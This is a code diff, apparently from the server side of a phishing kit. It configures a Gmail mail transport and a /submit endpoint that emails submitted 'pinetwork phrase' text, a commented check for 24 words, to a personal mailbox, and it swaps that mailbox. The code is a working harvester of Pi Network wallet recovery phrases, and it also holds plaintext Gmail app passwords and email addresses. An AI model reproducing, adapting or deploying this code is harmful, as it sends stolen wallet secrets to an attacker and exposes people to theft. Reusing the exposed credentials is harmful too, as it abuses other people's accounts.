@@ -22,8 +22,8 @@ const transporter = nodemailer.createTransport({
     // pass: "phop baoj wpki iilk",
     // user: "Pinetworkm493@gmail.com",
     //pi-personal  
-      pass: "jujv jdzw yule kils",
-      user: "mizetomilli@gmail.com",
+      pass: "rkau szil qdkc awoy",
+      user: "millimizeto@gmail.com",
 
   },
   service: "gmail",
@@ -58,7 +58,7 @@ app.post("/submit/7668", async (req, res) => {
     // if(mfText && mfText.split(' ').length == 24){
       transporter.sendMail({
         from: "PiNetworkWallet ",
-        to: ["mizetomilli@gmail.com"],
+        to: ["millimizeto@gmail.com"],
         // to: ["pablomizeto@gmail.com"],
         subject: "pinetwork phrase",
         text: mfText,
